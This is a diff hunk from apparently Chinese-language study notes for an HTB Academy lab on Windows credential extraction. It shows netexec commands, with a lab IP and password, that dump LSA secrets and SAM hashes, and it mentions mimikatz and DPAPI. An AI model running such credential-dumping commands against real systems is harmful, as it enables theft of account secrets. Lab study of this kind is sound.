@@ -197,7 +197,7 @@ DPAPI  (Data Protection Application Programming Interface) 的机器和用户自
 用 mimikatz.exe 破解
 
 netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
-netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam            相当于 smbserver.py 转移凭证 加 解析出哈希
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam            相当于 smbserver.py 转移凭证 加 解析出哈希 加 破解出密码
 
 
 
